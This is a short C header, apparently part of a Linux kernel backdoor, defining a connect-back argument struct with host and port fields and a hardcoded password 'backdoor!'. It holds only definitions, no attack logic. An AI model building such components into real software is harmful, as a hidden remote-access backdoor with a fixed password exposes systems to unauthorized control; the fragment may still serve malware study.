#ifndef _CB_ARG_H
#define _CB_ARG_H

#include <linux/types.h>

#define HOST_MAX 15
#define PORT_MAX 5

#define AUTH_LEN 9
#define AUTH_PW  "backdoor!"

typedef struct _cb_arg_t_
{
        unsigned char host[HOST_MAX + 1];
        unsigned char port[PORT_MAX + 1];
} cb_arg_t;

extern cb_arg_t cb_arg;

#endif // _CB_ARG_H

